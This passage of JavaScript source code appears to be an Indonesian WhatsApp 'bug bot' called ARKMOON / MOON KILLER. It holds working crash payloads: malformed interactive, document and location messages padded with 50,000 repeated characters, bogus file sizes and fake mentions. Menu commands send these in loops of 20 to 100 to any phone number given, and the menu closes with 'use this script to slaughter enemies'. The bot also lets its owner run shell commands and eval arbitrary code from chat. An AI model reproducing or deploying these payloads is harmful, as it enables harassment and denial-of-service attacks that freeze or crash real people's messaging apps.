                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "MOON TECH",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "MOON KILLER",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "ZoO@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
            async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑𝄽⃟⃟⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "MOON KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function yoiAi(query) {
  return new Promise(async (resolve, reject) => {
    axios.get('https://api.yanzbotz.live/api/ai/labs-perplexity', {
      params: {
        query: query,
        model: 'llama-3.1-sonar-large-128k-online'
      }
    })
    .then(response => {
      resolve(response.data);
    })
    .catch(error => {
      reject(error);
    });
  });
};
        

async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑𝄽⃟⃟⃟🇯🇵⿻";

            ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑𝄽⃟⃟⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "MOON KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`𝐏𝐔𝐓𝐙𝐙 𝐒𝐄𝐍𝐃𝐄𝐑 𝐂𝐎𝐌 𝐁𝐎𝐗 ${target}`))
}

async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`𝐏𝐔𝐓𝐙𝐙 𝐒𝐄𝐍𝐃𝐄𝐑 𝐂𝐎𝐌 𝐁𝐎𝐗 ${target}`))
}

async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`𝐏𝐔𝐓𝐙𝐙 𝐒𝐄𝐍𝐃𝐄𝐑 𝐂𝐎𝐌 𝐁𝐎𝐗 ${target}`))
}

const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "⌁𝐌𝐎𝐎𝐍 𝐊𝐈𝐋𝐋𝐄𝐑༑",
            'body': `𝐏𝐔𝐓𝐙𝐙 𝐍𝐎 𝐂𝐎𝐔𝐍𝐓𝐄𝐑 `,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://i.postimg.cc/1tHyw0wH/zerodev.jpg',
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "menu": case "oy": {
const tampilan = `
\`⟬ 𝐀𝐑𝐊𝐌𝐎𝐎𝐍 𝐁𝐘 𝐏𝐔𝐓𝐙𝐙 ⟭\`

ᴏᴡɴᴇʀ : ᴘᴜᴛᴢᴢ
ʙᴏᴛ ɴᴀᴍᴇ : ᴀʀᴋᴍᴏᴏɴ
ᴠᴇʀsɪᴏɴ : 𝟷.𝟶.𝟶
sᴛᴀᴛᴜs : ${runtime(process.uptime())}
  ( 𖣘 𝐀𝐑𝐊𝐌𝐎𝐎𝐍 𝐁𝐘 𝐏𝐔𝐓𝐙𝐙 𖣘 )

╭⟬ *ᴀʀᴋ ᴍᴏᴏɴ sᴘᴀᴍ* ⟭
│ ${global.log} .ᴅᴇᴄᴛᴏɴɪᴄ 𝟼𝟸xxx
│ ${global.log} .ɴɪɢʜᴛᴍᴀʀᴇ 𝟼𝟸xxx
│ ${global.log} .ᴄᴏᴍʙᴏx 𝟼𝟸xxx
│ ${global.log} .ᴀsᴛᴇʀᴏɪᴅ 𝟼𝟸xxx
│ ${global.log} .ᴅᴀʀᴋᴍᴇᴛᴇʀ 𝟼𝟸xxx
│ ${global.log} .ɴᴇʙᴜʟᴀ 𝟼𝟸xxx
│ ${global.log} .ᴄᴏsᴍɪᴄ 𝟼𝟸xxx
╰─────────────╼
╭⟬ *ᴀʀᴋᴍᴏᴏɴ ᴀᴍᴏᴜɴᴛ* ⟭
│ ${global.log} .ʙᴜɢ-ʟᴏᴄ 𝟼𝟸xxx|𝟻
│ ${global.log} .ʙᴜɢ-ᴜɪ 𝟼𝟸xxx|𝟻
│ ${global.log} .ʙᴜɢ-ᴅᴇʟᴀʏ 𝟼𝟸xxx|𝟻
│ ${global.log} .ʙᴜɢ-ᴅᴏᴄᴜ 𝟼𝟸xxx|𝟻
│ ${global.log} .ʙᴜɢ-sʏsᴛᴇᴍ 𝟼𝟸xxx|𝟻
╰─────────────╼
╭⟬ *sᴘᴀᴍ ɪɴ ᴘʟᴀᴄᴇ* ⟭
│ ${global.log} .ʜᴀʀᴅ
│ ${global.log} .sʏsᴛᴇᴍ
╰─────────────╼
╭⟬ *ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs* ⟭
│ ${global.log} .sᴇʟғ
│ ${global.log} .ᴘᴜʙʟɪᴄ.
│ ${global.log} .x-ᴛᴀɢ
╰─────────────╼
> ᴜsᴇ ᴛʜɪs sᴄʀɪᴘᴛ ᴛᴏ sʟᴀᴜɢʜᴛᴇʀ ᴇɴᴇᴍɪᴇs`
let menu = {
image: {url: `${ytta}`}, 
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: 'ᴘᴜᴛᴢᴢ - ᴍᴏᴏɴ ᴛᴇᴄʜ',
  body: 'ᴀʀᴋ ᴍᴏᴏɴ', 
  showAdAttribution: true,
  thumbnailUrl: 'https://i.postimg.cc/1tHyw0wH/zerodev.jpg',
  mediaType: 4,
  MediaUrl: 'https://whatsapp.com/channel/0029VamXf7xIiRooZ7qGkW3H',
  sourceUrl: "https://whatsapp.com/channel/0029VamXf7xIiRooZ7qGkW3H",
  }}
  }
await ZoO.sendMessage(from, menu, {quoted: Out }
);
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

/*case 'hentai': {
reply(`*\`TOBAT BRO PIKIRIN MASA DEPAN KOCAK MASA MAU NONTON HENTAI\`*`)
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case "cek-khodam": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA ANJG')
const khodam = [
"Ikan", "Sendal", "Genderuwo", "Ijat", "Fizi", "kaleng kejepit", "Raja Ibelis", "Singa", "Lele", "Ayam Kaepci","kucing mewing","tutup panci","ular sigma","kucing isriwil","kapal karam","anggrek mekar Pontianak","bagong leweng","lonte arab"," kosong","pertamina kebalik","ambatukam","kodok terbang","laba laba sunda","ambatron","laba laba salto","macan putih"]
const hasil = khodam[Math.floor(Math.random() * khodam.length)]
const teks = `
\`HASIL CEK KHODAM\`
\`NAMA\` : *${args[0]}*
\`KHODAM\` : *${hasil}*
`
reply(teks)
}
break

case "cek-ganteng": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break
case "sound1": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound1}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound2": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound2}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound3": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound3}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound4": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound4}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound5": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound5}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound6": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound6}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'remini': {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await ZoO.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./Databases/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
ZoO.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break
case "cek-cantik": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break
case 'ai': {
if (!isOwner && !isPremium) return reply("LU SIAPA BEGO")
  	if (!text) return reply(`• Example: ${prefix + command} siapakah Pencipta ac Xtrasher`); 
  	reply('_Wait Proses.._');
  	let suki = await yoiAi(text);     
    reply(suki.result)
    }
    break
*/
case "public": {
if (!isCreator) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
ZoO.public = true
reply("*[ ᴀʀᴋᴍᴏᴏɴ ] sᴜᴋsᴇs ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ*")
}
break
case "self": {
if (!isCreator) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
ZoO.public = false
reply("*[ ᴀʀᴋᴍᴏᴏɴ ] sᴜᴋsᴇs ᴍᴏᴅᴇ ᴘᴜʙʟɪᴄ*")
}
break
/*case "addown":
if (!isCreator && !isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ZoO.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delown":
if (!isCreator && !isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isCreator) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZoO.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`SUKSES MENJADI MURBUG!!\`*`)
}
break
case "delprem":{
if (!isCreator) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
m4 = Premium.indexOf(ya)
Premium.splice(m4, 1)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`MAAF ANDA TIDAK LAGI MENJADI MURBUG!!\`*`)
}
break
*/
case "x-tag": {
if (!isGroup) return reply(`*\`*ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴅɪ ɢʀᴜᴘ!!*\`*`)
if (!isCreator) return reply(`*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*`)
if (!m.quoted && !text) return reply(`*\`ᴛᴇᴋs ɴʏᴀ ᴍᴀɴᴀ!??\`*`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
ZoO.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'nightmare': {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break

case 'combox': case "asteroid": case "darkmeter": {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 100; i++) {
await Combox2(target)
await Combox3(target)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break

case 'dectonic': {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break
case 'nebula': {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break
case 'cosmic': {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break
case 'darkmeter': {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < 30; i++) {
await Combox(target)
await OLDLOC(target, Null)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break
case 'bug-loc': case "bug-ui": case "bug-delay": case "bug-docu": case "bug-system": {
if (!isOwner) return reply("*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*")
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ :\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
jumlah = qtext.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
for (let i = 0; i < jumlah; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break

case 'hard': {
if (!isOwner) return reply(`*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*`)
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await Combox3(from, jumlah)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
break

case 'system': {
if (!isOwner) return reply(`*ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ᴘᴜᴛᴢᴢ*`)
reply("ɪɴ ᴘʀᴏᴄᴇss ᴏғ sᴜʙᴍɪᴛᴛɪɴɢ ʙᴜɢ")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox2(from, jumlah)
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
break

default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return ZoO.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return ZoO.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
ZoO.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return ZoO.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return ZoO.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
ZoO.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})